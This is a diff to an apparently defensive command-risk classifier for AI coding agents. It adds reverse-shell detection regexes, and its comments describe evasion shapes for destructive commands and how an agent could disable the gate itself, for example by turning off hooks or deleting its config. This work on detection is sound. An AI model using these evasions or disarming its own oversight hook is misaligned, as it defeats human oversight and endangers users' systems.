@@ -15,6 +15,57 @@ import re
 # Directories where `rm -rf /<dir>` is catastrophic (data loss / unbootable).
 _CRITICAL_DIRS = "home|etc|usr|boot|root|sys|proc|lib|lib64|bin|sbin|opt"
 
+# Reverse shells -- an interactive shell handed to an attacker over a socket. In
+# an agent-security product these must never rate low/allowed (sable-0ki7:
+# evaluate_command rated them low). Folded into CRITICAL so they are hard-blocked
+# with no policy opt-out. Matched against the sanitized command (see
+# assess_command_risk), so an eval's -c/-e argument is inlined and quoted prose is
+# redacted. Parity with the Node sources in node/src/core/risk-rules.ts; benign
+# look-alikes (nc -z, OpenBSD nc -C host 25, socat - TCP:h:p, docker.socket,
+# --socket-path ... /bin/bash, trace=socket /bin/sh, ls config/dev/tcp/,
+# `import socket; print(...)`) covered with no false positive by the test suite.
+# Known limits fail OPEN because the payload is unreadable after sanitization, not
+# because a pattern is loose (tracked for follow-up, not papered over with a broad
+# rule that would hard-block benign commands): a payload piped into a non-shell
+# interpreter (`echo '<code>' | python3`); a variable-split or base64/$() blob;
+# the quoted-operand forms of php -r, socat exec:'/bin/sh', gawk, telnet, rcat.
+# `... | sh` and base64-into-shell still degrade to high via shell_program_from_stream.
+_REVERSE_SHELL_PATTERNS: list[str] = [
+    # bash/zsh net redirect `>& /dev/tcp/host/port`: output to the socket or
+    # fd duplication onto it (`>`, `>&`, `&>`, `<>`, `<&`), or a shell reading
+    # its program from it (`bash < /dev/tcp/...`; `-c` excluded so the inlined
+    # payload is not mistaken for the shell's stdin). A read-only redirect (the
+    # wait-for-port idiom `bash -c '</dev/tcp/h/p'`, `cat < /dev/tcp/...`) and a
+    # path component (`ls config/dev/tcp/`) do not match.
+    r"((>|<>|[<>]&)\s*|\b(ba|z|da|k|a)?sh(\s+-[abd-z]+)*\s*<\s*)/dev/(tcp|udp)/",
+    # ...or an interactive shell anywhere beside the pseudo-device.
+    r"^(?=[\s\S]*(^|[\s<>&;|])/dev/(tcp|udp)/)(?=[\s\S]*\b(ba|z|da|k|a)?sh\s+-[a-z]*i)",
+    # netcat exec flag: `-e` anywhere in a short cluster (`-e`/`-ve`/`-nve`) or
+    # long `--exec`/`--sh-exec`/`--lua-exec`. `-c` omitted: after case-folding it
+    # collides with OpenBSD `nc -C` (CRLF); no benign nc cluster carries `e`.
+    r"\b(nc|ncat|netcat)\b[^|;&]*\s(-[a-z]*e\b|--(sh-|lua-)?exec\b)",
+    # named-pipe relay: fifo AND netcat AND a shell (any order); a fifo beside a
+    # benign `nc -z`/`nc -l` health check lacks the shell and does not match
+    r"^(?=[\s\S]*\b(mkfifo|mknod)\b)(?=[\s\S]*\b(nc|ncat|netcat)\b)(?=[\s\S]*(/bin/(ba)?sh|\b(ba)?sh\b[^\n]*-i))",
+    # socat with a program endpoint (`EXEC:`/`SYSTEM:`); not a plain relay
+    r"\bsocat\b[\s\S]*\b(exec|system):",
+    # interpreter socket one-liner, part A: a socket *call* (not the bare word,
+    # in --socket-path/docker.socket/trace=socket) + a spawn that NAMES a shell.
+    # Order-independent anchored lookaheads: catches the socket-after-spawn
+    # (canonical Node.js) form, and linear (no prefix[\s\S]*suffix backtracking).
+    r"""^(?=[\s\S]*(socket\.socket|\bsocket\s*\(|tcpsocket\.|io::socket|pf_inet|sock_stream|net\.socket))(?=[\s\S]*(pty\.spawn|/bin/(ba)?sh|(os\.system|system|exec|popen|spawnsync|spawn|subprocess\.(call|run|popen|check_output|check_call))\s*[\s(\[{"']*/?(bin/)?(ba|z|da|a|k)?sh\b))""",
+    # interpreter socket one-liner, part B: a socket call + a generic exec/system
+    # + socket-fd wiring (dup2/fileno/pipe/redirect/read-loop). Catches forms
+    # whose shell name arrives from the socket at runtime (perl `system $_ while
+    # <$s>`, a node `.pipe()` bridge) without hard-blocking a benign socket
+    # script that merely shells out (which has no such wiring).
+    r"^(?=[\s\S]*(socket\.socket|\bsocket\s*\(|tcpsocket\.|io::socket|pf_inet|sock_stream|net\.socket))(?=[\s\S]*(\bexec\b|\bsystem\b|os\.system|subprocess\.|\bpopen\s*\(|\bspawn\s*\())(?=[\s\S]*(dup2|fileno|\.pipe\s*\(|<&|>&|fdopen|while\s*<))",
+    # zsh TCP-module reverse shell (`zmodload zsh/net/tcp; ztcp host port; ...`)
+    r"\bzmodload\b[\s\S]*zsh/net/tcp",
+    # powershell/pwsh TCPClient reverse shell (cross-platform pwsh on Linux too)
+    r"system\.net\.sockets\.tcpclient",
+]
+
 # Catastrophic, irreversible commands. Hard-blocked unconditionally — no policy,
 # mode, or deny-list can opt out of them.
 CRITICAL_PATTERNS: list[str] = [
@@ -30,6 +81,7 @@ CRITICAL_PATTERNS: list[str] = [
     r"mkfs",
     r"fdisk",
     r"parted",
+    *_REVERSE_SHELL_PATTERNS,
 ]
 
 HIGH_PATTERNS: list[str] = [
@@ -106,7 +158,18 @@ DEFAULT_REQUIRE_APPROVAL: list[str] = [
 _SHELL_EXECS = {"bash", "sh", "zsh", "dash", "ksh", "ash", "fish", "su"}
 
 # Execs whose arguments are executable text (a remote command, a script).
-_EVAL_EXECS = {"eval", "exec", "ssh", "sshpass", "xargs"}
+_EVAL_EXECS = {
+    # `trap 'cmd' EXIT` registers a command string that runs when the shell
+    # LEAVES. The payload is an ordinary quoted operand, so without this it is
+    # redacted as prose exactly as `echo "..."` correctly is. The deferral
+    # changes the deny message and the audit trail, not the decision. (rf-zvll A2)
+    "trap",
+    "eval",
+    "exec",
+    "ssh",
+    "sshpass",
+    "xargs",
+}
 
 # Flags carrying an executable string (`bash -c`, `python -c`, `mysql -e`, `find -exec`).
 _EVAL_FLAGS = {"-c", "-e", "--command", "--execute", "--eval", "-exec", "--exec"}
@@ -129,7 +192,16 @@ _TEXT_FLAGS = {
 # Operators that chain independent commands.
 _CHAIN_OPS = {";", "&&", "||", "|", "&"}
 
+
+
 # Operators whose following token is a redirect target (a path — never data).
+# `<<<` is deliberately ABSENT: it is a here-STRING, and its operand is stdin
+# CONTENT, not a path. Treating it as a redirect target left the text untouched,
+# which over-blocked a data owner (`cat <<< "…rm -rf /…" > notes.md` classified
+# critical -- #230's shape, one operator over) and under-blocked a shell one
+# (`bash <<< "rm -rf /"` classified high, though the shell runs it). Falling
+# through to the ordinary operand path asks the question the heredoc work
+# already answers: does this command execute what it reads? (sable-4nt2)
 _REDIRECT_OPS = {">", ">>", "<", "<<"}
 
 # Bound on recursion through nested shell wrappers / substitutions.
@@ -140,6 +212,20 @@ _SHELL_C_FLAG = re.compile(r"^-[a-z]*c$")
 _LONG_FLAG_WITH_VALUE = re.compile(r"^(--[a-z][a-z-]*)=")
 _NUMERIC_ARG = re.compile(r"^\d+[a-z]*$", re.IGNORECASE)
 _WHITESPACE = re.compile(r"\s")
+
+# A heredoc introducer: `<<`, optional `-`/`~` (indented-terminator forms), an
+# optional quote around the delimiter, and the delimiter word. Group 1 is the
+# dash/tilde, group 3 is the delimiter name.
+_HEREDOC_START = re.compile(
+    # The `(?<!<)` / `(?!<)` guards are load-bearing: without them `<<<`
+    # matches starting at its SECOND `<`, so `cat <<< "hello"` is read as a
+    # heredoc with delimiter `hello`, no terminator is ever found, and every
+    # line after it is stripped — silently hiding whatever came next from the
+    # classifier, hard block included.
+    r"(?<!<)<<(?!<)([-~]?)\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\2"
+)
+# Chain/pipe operators, used to find the statement that owns a heredoc.
+_CHAIN_SPLIT = re.compile(r"\|\||&&|[;|&]")
 
 
 class _Piece:
@@ -165,7 +251,9 @@ class _Piece:
 
 
 def _is_op_char(c: str) -> bool:
-    return c in (";", "&", "|", ">", "<")
+    # \n and \r are statement separators (rf-6pqx): a newline ends a command
+    # exactly as ";" does, so a payload on a later line is classified on its own.
+    return c in (";", "&", "|", ">", "<", "\n", "\r")
 
 
 def _read_subst(s: str, i: int) -> tuple[str, int]:
@@ -196,23 +284,64 @@ def _read_backtick(s: str, i: int) -> tuple[str, int]:
     return "".join(inner), min(j + 1, len(s))
 
 
-def _tokenize(s: str) -> list[_Piece]:
-    """Split a command line into words and operators, respecting quotes/substitutions."""
+def _tokenize(s: str) -> tuple[list[_Piece], bool]:
+    """Split a command line into words and operators, respecting quotes/substitutions.
+
+    Returns (pieces, unterminated). `unterminated` is True when a quote was never
+    closed — the parse is then unreliable and the caller must FAIL CLOSED
+    (match the raw string) rather than trust a desynchronized sanitization
+    (se-y6vo: `$'a\\'b'` desyncs quote state and swallows a trailing payload).
+    """
     pieces: list[_Piece] = []
     i = 0
     n = len(s)
+    unterminated = False
 
     while i < n:
         c = s[i]
 
-        if c.isspace():
+        # Whitespace EXCEPT newlines is skipped; a newline falls through to the
+        # operator branch below so it becomes a statement separator (rf-6pqx).
+        if c.isspace() and c not in ("\n", "\r"):
             i += 1
+            continue
+
+        # `<(cmd)` / `>(cmd)` -- PROCESS SUBSTITUTION. The content is a command
+        # that RUNS, exactly as `$(cmd)` does, so it goes in substs and the
+        # existing recursive scan handles it with no new rule.
+        #
+        # Without this the tokenizer never forms the construct: it emits op `<`,
+        # which is in _REDIRECT_OPS, so `(cmd` becomes a redirect TARGET and is
+        # left untouched, while the remaining words are redacted as the host's
+        # data operands. TWO independent wrong decisions that conspire --
+        # `ack <(rm -rf /)` sanitized to `ack <(rm    `, the harmless-looking
+        # head preserved and the dangerous tail deleted. Fixing either alone
+        # leaves the bypass, which is worth knowing when reviewing this. (rf-zvll)
+        if c in ("<", ">") and i + 1 < n and s[i + 1] == "(":
+            start = i
+            inner, i = _read_subst(s, i)
+            pieces.append(_Piece(start, i, None, "", False, [inner]))
             continue
 
         if _is_op_char(c):
             start = i
+            if c in ("\n", "\r"):
+                # Normalize a line break (incl. CRLF) to a ";" separator piece.
+                i += 1
+                pieces.append(_Piece(start, i, ";", ";", False, []))
+                continue
             two = s[i:i + 2]
-            op = two if two in ("&&", "||", ">>", "<<") else c
+            # `<<<` before `<<`, or it tokenizes as `<<` + `<` and the
+            # here-string operand becomes a redirect target -- left untouched,
+            # which is how it ended up both over- and under-blocked
+            # (sable-4nt2).
+            three = s[i:i + 3]
+            if three == "<<<":
+                op = three
+            elif two in ("&&", "||", ">>", "<<"):
+                op = two
+            else:
+                op = c
             i += len(op)
             pieces.append(_Piece(start, i, op, op, False, []))
             continue
@@ -228,6 +357,18 @@ def _tokenize(s: str) -> list[_Piece]:
                 break
 
             if ch == "\\":
+                # Line continuation: a backslash immediately before a newline
+                # (incl. CRLF) is DELETED by the shell — `r\<NL>m` is `rm`, so
+                # the newline must not be absorbed into the word (rf-6pqx/se-y6vo).
+                nxt = s[i + 1] if i + 1 < n else ""
+                if nxt == "\n":
+                    i += 2
+                    continue
+                if nxt == "\r":
+                    i += 2
+                    if i < n and s[i] == "\n":
+                        i += 1
+                    continue
                 i += 1
                 if i < n:
                     text.append(s[i])
@@ -238,18 +379,38 @@ def _tokenize(s: str) -> list[_Piece]:
             if ch == "'":
                 i += 1
                 quoted = True
-                while i < n and s[i] != "'":
+                closed = False
+                while i < n:
+                    if s[i] == "'":
+                        closed = True
+                        i += 1
+                        break
                     text.append(s[i])
                     i += 1
-                i += 1
+                if not closed:
+                    unterminated = True
                 continue
 
             # Double quotes are data, but `$( )` / backticks inside them DO execute.
             if ch == '"':
                 i += 1
                 quoted = True
-                while i < n and s[i] != '"':
+                closed = False
+                while i < n:
+                    if s[i] == '"':
+                        closed = True
+                        i += 1
+                        break
                     if s[i] == "\\":
+                        nxt = s[i + 1] if i + 1 < n else ""
+                        if nxt == "\n":
+                            i += 2
+                            continue
+                        if nxt == "\r":
+                            i += 2
+                            if i < n and s[i] == "\n":
+                                i += 1
+                            continue
                         i += 1
                         if i < n:
                             text.append(s[i])
@@ -265,7 +426,8 @@ def _tokenize(s: str) -> list[_Piece]:
                         continue
                     text.append(s[i])
                     i += 1
-                i += 1
+                if not closed:
+                    unterminated = True
                 continue
 
             if ch == "$" and i + 1 < n and s[i + 1] == "(":
@@ -282,7 +444,22 @@ def _tokenize(s: str) -> list[_Piece]:
 
         pieces.append(_Piece(start, i, None, "".join(text), quoted, substs))
 
-    return pieces
+    return pieces, unterminated
+
+
+def is_chained_command(command: str) -> bool:
+    r"""True if the command contains more than one statement.
+
+    Asked of the TOKENIZER rather than a regex. The first version of this was
+    ``re.compile(r"[;|&]|&&|\|\|")``, which omits the newline — and a newline
+    has been a statement separator in this module since rf-6pqx. With
+    ``^git push origin feature/`` allowlisted, ``git push origin feature/x`` and
+    a second line holding ``git push --force origin main`` classified ``allow``.
+    The tokenizer already normalises ``\n`` to ``;``, so routing the question
+    through it removes the second, narrower definition instead of widening it.
+    """
+    pieces, _ = _tokenize(command)
+    return any(p.op is not None and p.op in _CHAIN_OPS for p in pieces)
 
 
 def _exec_name(text: str) -> str:
@@ -290,10 +467,48 @@ def _exec_name(text: str) -> str:
     return text[text.rfind("/") + 1:].lower()
 
 
+def _segment_exec(pieces: list[_Piece]) -> str:
+    """The effective executable of a segment (`sudo rm -rf /` -> `rm`).
+
+    Used to ask what the NEXT stage of a pipeline does with this stage's output.
+    """
+    is_redirect_target = [False] * len(pieces)
+    for i in range(1, len(pieces)):
+        prev = pieces[i - 1]
+        if prev.op in _REDIRECT_OPS and pieces[i].op is None:
+            is_redirect_target[i] = True
+    i = 0
+    while i < len(pieces):
+        p = pieces[i]
+        if p.op is not None or is_redirect_target[i]:
+            i += 1
+            continue
+        if not p.quoted and _ENV_ASSIGNMENT.match(p.text):
+            i += 1
+            continue
+        if not p.quoted and _exec_name(p.text) in _TAIL_WRAPPERS:
+            j = i + 1
+            while j < len(pieces):
+                q = pieces[j]
+                if q.op is not None or is_redirect_target[j]:
+                    j += 1
+                    continue
+                if q.text.startswith("-") or _NUMERIC_ARG.match(q.text):
+                    j += 1
+                    continue
+                break
+            i = j
+            continue
+        return _exec_name(p.text)
+    return ""
+
+
 def _process_segment(
     pieces: list[_Piece],
     depth: int,
     out: list[tuple[int, int, str]],
+    piped_into_shell: bool = False,
+    output_executed: bool = False,
 ) -> None:
     """Decide which spans of one segment are DATA and which are code."""
     # A word is a redirect target when the piece before it is `>`/`>>`/`<`.
@@ -349,6 +564,14 @@ def _process_segment(
             has_eval_flag = True
     code_carrying = has_shell_exec or has_eval_flag or exec_ in _EVAL_EXECS
 
+    # sable-c6an. Two questions the code conflated:
+    #   code_carrying   -- this segment RUNS a command string it was handed
+    #   executes_output -- this segment's STDOUT becomes code somewhere else
+    #                      (`… | bash`, or a substitution used as a -c script)
+    # `bash -c "echo 'rm -rf /'"` is the first and not the second, so its
+    # operand stays data; `bash -c "$(echo rm -rf /)"` is the second.
+    executes_output = piped_into_shell or output_executed
+
     seen_shell = False
     pending_script = False
     prev_text_flag = False
@@ -366,7 +589,15 @@ def _process_segment(
 
         # `bash -c <script>` — the next word is a command string, not data.
         if pending_script and not p.text.startswith("-"):
-            out.append((p.start, p.end, _sanitize(p.text, depth + 1)))
+            # The script can be entirely a substitution -- `bash -c "$(…)"` --
+            # where `text` is EMPTY and the substitution IS the script. Reading
+            # only `text` dropped it (sable-c6an).
+            parts: list[str] = []
+            if p.text != "":
+                parts.append(_sanitize(p.text, depth + 1))
+            for sub in p.substs:
+                parts.append(_sanitize(sub, depth + 1, True))
+            out.append((p.start, p.end, " ".join(parts)))
             pending_script = False
             prev_text_flag = False
             continue
@@ -378,7 +609,10 @@ def _process_segment(
 
         # `$(…)` / backticks execute — scan their contents, drop the literal wrapper.
         if p.substs:
-            inner = " ".join(_sanitize(s, depth + 1) for s in p.substs)
+            inner = " ".join(
+                _sanitize(s, depth + 1, code_carrying or executes_output)
+                for s in p.substs
+            )
             out.append((p.start, p.end, inner))
             prev_text_flag = False
             continue
@@ -413,7 +647,7 @@ def _process_segment(
         prev_text_flag = False
 
         # Operands of a text command (`echo`, `grep`, `printf`) are never executed.
-        if is_text_exec and i > exec_idx:
+        if is_text_exec and i > exec_idx and not executes_output:
             out.append((p.start, p.end, " "))
             continue
 
@@ -423,7 +657,7 @@ def _process_segment(
                 # Single-word quoted operand: unquote it so quoting cannot hide a
                 # flag or a path from the patterns (`rm "-rf" "/"`).
                 out.append((p.start, p.end, p.text))
-            elif code_carrying:
+            elif code_carrying or executes_output:
                 # This segment executes a command string (`ssh host "…"`,
                 # `mysql -e "…"`). The quoted argument is code — unquote and scan
                 # it, recursively.
@@ -433,21 +667,91 @@ def _process_segment(
                 out.append((p.start, p.end, " "))
 
 
-def _sanitize(command: str, depth: int) -> str:
+def _strip_line_continuations(s: str) -> str:
+    """Remove `\\<newline>` line continuations the way a shell does BEFORE parsing.
+
+    `r\\<NL>m -rf /` is `rm -rf /` to bash, so the backslash-newline must be
+    deleted or the token `rm` never forms and the pattern misses it (se-y6vo).
+    Removed when unquoted or inside double quotes; PRESERVED inside single quotes
+    (where bash keeps it literal). A normal escape (`\\x`) is left untouched.
+    """
+    if "\\" not in s:
+        return s
+    out: list[str] = []
+    i = 0
+    n = len(s)
+    in_single = False
+    in_double = False
+    while i < n:
+        c = s[i]
+        if c == "'" and not in_double:
+            in_single = not in_single
+            out.append(c)
+            i += 1
+            continue
+        if c == '"' and not in_single:
+            in_double = not in_double
+            out.append(c)
+            i += 1
+            continue
+        if c == "\\" and not in_single:
+            nxt = s[i + 1] if i + 1 < n else ""
+            if nxt == "\n":
+                i += 2
+                continue
+            if nxt == "\r":
+                i += 2
+                if i < n and s[i] == "\n":
+                    i += 1
+                continue
+            # A normal escape (`\"`, `\$`, …): keep both chars verbatim so an
+            # escaped quote does not flip the quote state above.
+            out.append(c)
+            if i + 1 < n:
+                out.append(s[i + 1])
+                i += 2
+            else:
+                i += 1
+            continue
+        out.append(c)
+        i += 1
+    return "".join(out)
+
+
+def _sanitize(command: str, depth: int, output_executed: bool = False) -> str:
     if not command or depth > _MAX_SANITIZE_DEPTH:
         return command
 
-    pieces = _tokenize(command)
+    command = _strip_line_continuations(command)
+    pieces, unterminated = _tokenize(command)
+    # Fail closed: an unterminated quote means the parse desynchronized from the
+    # shell, so a sanitized view could hide an executable payload. Match the raw
+    # command instead (se-y6vo).
+    if unterminated:
+        return command
     replacements: list[tuple[int, int, str]] = []
 
+    # Segments keep the operator that ends them, so a segment can be asked
+    # whether its output feeds a shell (`echo "rm -rf /" | bash`).
+    segments: list[tuple[list[_Piece], str | None]] = []
     segment: list[_Piece] = []
     for p in pieces:
         if p.op is not None and p.op in _CHAIN_OPS:
-            _process_segment(segment, depth, replacements)
+            segments.append((segment, p.op))
             segment = []
             continue
         segment.append(p)
-    _process_segment(segment, depth, replacements)
+    segments.append((segment, None))
+
+    for k, (seg, end_op) in enumerate(segments):
+        piped_into_shell = (
+            end_op == "|"
+            and k + 1 < len(segments)
+            and _segment_exec(segments[k + 1][0]) in _SHELL_EXECS
+        )
+        _process_segment(
+            seg, depth, replacements, piped_into_shell, output_executed
+        )
 
     if not replacements:
         return command
@@ -465,29 +769,835 @@ def _sanitize(command: str, depth: int) -> str:
     return "".join(out)
 
 
+def _heredoc_owner_executes(line: str, lt_pos: int) -> bool:
+    """Does the command that owns the heredoc EXECUTE its body?
+
+    `cat > f <<EOF` / `grep -q x <<EOF` consume the body as DATA (write it,
+    search it). `bash <<EOF` / `sh <<'EOF'` / `ssh host <<EOF` EXECUTE it. Only
+    the data case may be stripped; an executed body must stay visible to the
+    patterns (else the newline fix would open a fresh bypass — se-y6vo).
+    """
+    head = line[:lt_pos]
+    segments = _CHAIN_SPLIT.split(head)
+    seg = segments[-1] if segments else head
+    tokens = seg.split()
+    idx = 0
+    while idx < len(tokens):
+        tok = tokens[idx]
+        if _ENV_ASSIGNMENT.match(tok):
+            idx += 1
+            continue
+        name = _exec_name(tok)
+        if name in _TAIL_WRAPPERS:
+            idx += 1
+            while idx < len(tokens) and (
+                tokens[idx].startswith("-") or _NUMERIC_ARG.match(tokens[idx])
+            ):
+                idx += 1
+            continue
+        return name in _SHELL_EXECS or name in _EVAL_EXECS
+    return False
+
+
+def _heredoc_output_piped_to_shell(line: str, lt_pos: int) -> bool:
+    """`cat <<EOF | bash` — the body is data to `cat`, but `cat`'s OUTPUT is the
+    script, so the body is executed after all.
+
+    The owner check above only reads the text BEFORE the introducer and never
+    sees the pipe, so without this a heredoc piped into a shell is stripped and
+    the hard block is silently lost. Keeping a body is the safe direction: it
+    can only over-block, and only for a shape that should block anyway.
+    """
+    for stage in line[lt_pos:].split("|")[1:]:
+        tokens = [t for t in stage.strip().split() if t]
+        idx = 0
+        while idx < len(tokens):
+            tok = tokens[idx]
+            if _ENV_ASSIGNMENT.match(tok):
+                idx += 1
+                continue
+            name = _exec_name(tok)
+            if name in _TAIL_WRAPPERS:
+                idx += 1
+                while idx < len(tokens) and (
+                    tokens[idx].startswith("-") or _NUMERIC_ARG.match(tokens[idx])
+                ):
+                    idx += 1
+                continue
+            return name in _SHELL_EXECS or name in _EVAL_EXECS
+    return False
+
+
+def _strip_heredoc_bodies(command: str) -> str:
+    """Blank heredoc BODIES that a command consumes as DATA, before tokenizing.
+
+    A heredoc body written to a file (`cat > doc.md <<EOF … EOF`) or searched
+    (`grep <<EOF … EOF`) is data, never executed. Leaving it in place makes the
+    newline-as-separator fix (rf-6pqx) classify ordinary documentation writes as
+    CRITICAL (rf-3rsj), and is the same over-block the public #230 reporter hit.
+    Stripping it fixes both. A body EXECUTED by a shell/eval owner is KEPT so it
+    is still scanned. Co-designed with kerckhoffs (se-ijzs) and achebe (#230).
+
+    Known limits: a literal `<<WORD` inside a quoted string is still treated as an
+    introducer, and delimiters are matched by `.strip() == DELIM` (looser than
+    bash, erring toward scanning more, which is the safe direction).
+    """
+    if "<<" not in command:
+        return command
+    lines = command.split("\n")
+    out: list[str] = []
+    k = 0
+    while k < len(lines):
+        line = lines[k]
+        out.append(line)
+        matches = list(_HEREDOC_START.finditer(line))
+        k += 1
+        if not matches:
+            continue
+        lt_pos = matches[0].start()
+        keep = _heredoc_owner_executes(line, lt_pos) or (
+            _heredoc_output_piped_to_shell(line, lt_pos)
+        )
+        for m in matches:
+            delim = m.group(3)
+            dash = m.group(1)  # '-'/'~': a tab-indented terminator is allowed
+            while k < len(lines):
+                # bash terminates a heredoc only on a line EXACTLY equal to the
+                # delimiter — for plain `<<` an indented delimiter is body, not a
+                # terminator; `<<-` strips leading TABS first. (rstrip \r for CRLF.)
+                cand = lines[k].rstrip("\r")
+                if dash:
+                    cand = cand.lstrip("\t")
+                if cand == delim:
+                    k += 1  # drop the terminator line
+                    break
+                if keep:
+                    out.append(lines[k])
+                k += 1
+    return "\n".join(out)
+
+
 def sanitize_command_for_matching(command: str) -> str:
     """Normalize a command line for risk/policy pattern matching.
 
     Quoted text the command consumes as DATA is redacted; text a shell or eval
-    wrapper EXECUTES is preserved (and recursively sanitized). Everything else is
-    untouched.
+    wrapper EXECUTES is preserved (and recursively sanitized). Heredoc bodies
+    consumed as data are stripped first. Everything else is untouched.
     """
+    command = _strip_heredoc_bodies(command)
     return _sanitize(command, 0)
+
+
+# rf-vnxs — reconfiguring rafter's OWN security controls is a PROTECTED CLASS.
+#
+# The gate must never approve its own disarming. On 0.10.1 it did: the hook
+# rated `rafter agent config set agent.hooks.enabled false` as `low`, allowed
+# it, and every later command — including the CRITICAL tier that no policy,
+# mode or deny-list can override — was then permitted. Three steps, no
+# malformed command, and it persists to config.json.
+#
+# Matched STRUCTURALLY (resolved exec + argv walk), never by string: every one
+# of these was observed ALLOWED on the published artifact — extra whitespace,
+# `FALSE`, `npx @rafter-security/cli …`, `pnpm dlx`, `sudo -E rafter …`, an
+# absolute path, the `agent disable` component route, and three separate
+# self-disabling keys. A blacklist of one string is one alias from being inert.
+_RAFTER_EXECS = {"rafter", "rafter-cli"}
+_PACKAGE_RUNNERS = {"npx", "bunx", "pnpx", "dlx", "pnpm", "yarn", "bun"}
+_RAFTER_PACKAGE = re.compile(r"^(?:@rafter-security/cli|rafter-cli|rafter)(?:@[\w.^~*-]+)?$")
+
+# Config keys that gate the hook. A namespace, not a leaf — see hook_control.
+_PROTECTED_CONFIG_KEY = re.compile(r"^(?:agent\.)?(?:hooks|commandpolicy)\b|^agent\.risklevel$")
+
+
+def _statement_disarms_rafter(words: list[_Piece]) -> bool:
+    """True if this statement's argv reconfigures or removes a rafter control.
+
+    The rafter invocation is looked for at ANY position, not just as the
+    statement's own exec: a shell carrying a command string puts it in the
+    operand, so `bash -c "rafter agent config set …"` and `bash -c "$(echo
+    rafter …)"` both reduce to a statement whose exec is `bash`. A quoted word
+    is skipped on the raw pass so `echo 'rafter agent config set …'` stays
+    prose; the sanitized pass sees operands that are actually executed already
+    unwrapped.
+    """
+    for j in range(len(words)):
+        if words[j].quoted:
+            continue
+        k = j
+        exec_ = _exec_name(words[k].text)
+        k += 1
+
+        if exec_ in _PACKAGE_RUNNERS:
+            while k < len(words) and (words[k].text.startswith("-") or words[k].text.lower() in ("dlx", "exec")):
+                k += 1
+            if k >= len(words) or not _RAFTER_PACKAGE.match(words[k].text.lower()):
+                continue
+            k += 1
+            exec_ = "rafter"
+        if exec_ not in _RAFTER_EXECS:
+            continue
+
+        args = [w.text.lower() for w in words[k:] if not w.text.startswith("-")]
+        for n in range(len(args) - 1):
+            if args[n] == "config" and args[n + 1] == "set":
+                key = args[n + 2] if n + 2 < len(args) else None
+                if key and _PROTECTED_CONFIG_KEY.match(key):
+                    return True
+            if args[n] == "agent" and args[n + 1] == "disable":
+                return True
+    return False
+
+
+def _disarms_rafter(command: str, depth: int = 0) -> bool:
+    """True if any statement (or command substitution) disarms rafter."""
+    if depth > _MAX_SANITIZE_DEPTH:
+        return False
+    pieces, _ = _tokenize(command)
+    statements: list[list[_Piece]] = []
+    stmt: list[_Piece] = []
+    for p in pieces:
+        if p.op is not None:
+            if p.op in _CHAIN_OPS or p.op in ("\n", "\r"):
+                statements.append(stmt)
+                stmt = []
+            continue
+        stmt.append(p)
+        for sub in (p.substs or []):
+            if _disarms_rafter(sub, depth + 1):
+                return True
+    statements.append(stmt)
+    return any(_statement_disarms_rafter(st) for st in statements)
+
+
+def modifies_rafter_security_config(command: str) -> bool:
+    """True if the command disarms rafter, checked on raw AND sanitized text.
+
+    Raw catches the ordinary invocation; sanitized catches a shell running the
+    OUTPUT of something else, whose own exec is `echo` and which a walk over
+    the raw argv therefore reads, correctly, as a print.
+    """
+    if _disarms_rafter(command):
+        return True
+    if _writes_rafter_dir(command):
+        return True
+    sanitized = sanitize_command_for_matching(command)
+    return sanitized != command and _disarms_rafter(sanitized)
+
+
+def _writes_rafter_dir(command: str) -> bool:
+    """sable-36oe: the SHELL route to rafter's own directory (``~/.rafter``).
+
+    The Write/Edit route already refuses it (rf-vnxs, ``_writes_rafter_security_config``
+    in commands/hook.py); ``rm ~/.rafter/config.json`` disarms the gate exactly
+    as ``rafter agent config set agent.hooks.enabled false`` does.
+
+    Deny-by-default scoped to the path, NOT a blocklist of write verbs, which
+    are unbounded. A command is protected when a statement that NAMES the
+    rafter dir is not a known read-only command without an output redirect.
+    Statements that do not name it are not constrained; a cd INTO the dir is
+    itself not read-only, which keeps ``cd ~/.rafter && echo x > config.json``
+    blocked. Checked on the raw text (a quoted reference
+    counts) and on the normalized view (brace lists, ANSI-C quotes). Mirrors
+    node/src/core/risk-rules.ts ``writesRafterDir`` decision for decision.
+    """
+    if _rafter_dir_scan(command):
+        return True
+    normalized = normalize_for_matching(command)
+    return normalized != command and _rafter_dir_scan(normalized)
+
+
+_RAFTER_DIR_NAME = ".rafter"
+_NAME_CHAR = re.compile(r"[a-z0-9_.-]", re.IGNORECASE)
+_GLOB_CHAR = re.compile(r"[*?\[]")
+
+
+def _is_name_char(c: str) -> bool:
+    """Characters that continue a file name: ``.rafter.yml`` is not ``.rafter``."""
+    return bool(_NAME_CHAR.fullmatch(c))
+
+
+def _names_rafter_dir(text: str, globs: bool) -> bool:
+    """True if ``text`` names the rafter dir as a whole path component.
+
+    Case-insensitive (macOS file systems are). With ``globs``, an unquoted
+    component that could glob to it (``.raf*``, ``.r?fter``, ``.*``) counts:
+    bash never lets a wildcard match a leading dot, so only a component that
+    starts with a literal "." qualifies, and the match is over-approximated as
+    "the literal characters outside brackets appear in order in 'rafter'".
+    """
+    t = text.lower()
+    n = len(_RAFTER_DIR_NAME)
+    i = t.find(_RAFTER_DIR_NAME)
+    while i != -1:
+        before = t[i - 1] if i > 0 else ""
+        after = t[i + n] if i + n < len(t) else ""
+        if (before == "" or not _is_name_char(before)) and (after == "" or not _is_name_char(after)):
+            return True
+        i = t.find(_RAFTER_DIR_NAME, i + 1)
+    if not globs:
+        return False
+    for comp in t.split("/"):
+        if not comp or comp[0] != "." or not _GLOB_CHAR.search(comp):
+            continue
+        want = "rafter"
+        k = 0
+        in_bracket = False
+        ok = True
+        for c in comp[1:]:
+            if in_bracket:
+                if c == "]":
+                    in_bracket = False
+                continue
+            if c == "[":
+                in_bracket = True
+                continue
+            if c in ("*", "?"):
+                continue
+            while k < len(want) and want[k] != c:
+                k += 1
+            if k == len(want):
+                ok = False
+                break
+            k += 1
+        if ok:
+            return True
+    return False
+
+
+#: Read-only commands: with no output redirect they can neither write a file
+#: nor run another program. NOT here: sed (its ``w``/``e`` commands write and
+#: execute without -i), less (``-o`` writes a log), tee/cp/mv/rm/ln/chmod/
+#: touch/truncate/dd, and anything that runs a program.
+_READ_ONLY_EXECS = {
+    "cat", "more", "head", "tail", "ls", "stat", "file", "wc",
+    "grep", "egrep", "fgrep", "rg", "jq", "diff", "cmp",
+    "md5sum", "sha1sum", "sha224sum", "sha256sum", "sha384sum", "sha512sum",
+    "shasum", "b2sum", "cksum",
+    "find", "test", "[", "realpath", "readlink", "du",
+    "cd", "pushd", "popd",
+}
+#: find actions that delete, run a program, or write a file.
+_FIND_WRITE_ACTIONS = {
